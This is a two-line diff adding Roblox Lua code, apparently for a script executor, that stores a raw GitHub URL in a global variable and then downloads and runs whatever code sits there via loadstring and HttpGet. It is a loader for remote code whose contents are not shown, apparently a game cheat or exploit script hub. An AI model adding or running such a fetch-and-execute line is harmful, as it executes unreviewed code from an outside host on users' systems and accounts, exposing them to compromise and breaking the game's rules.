@@ -1,0 +1,2 @@
+getgenv().NYANZA_URL = "https://raw.githubusercontent.com/nyanzadev/Nyanza/refs/heads/main/nyanzawanted"
+loadstring(game:HttpGet(getgenv().NYANZA_URL))()
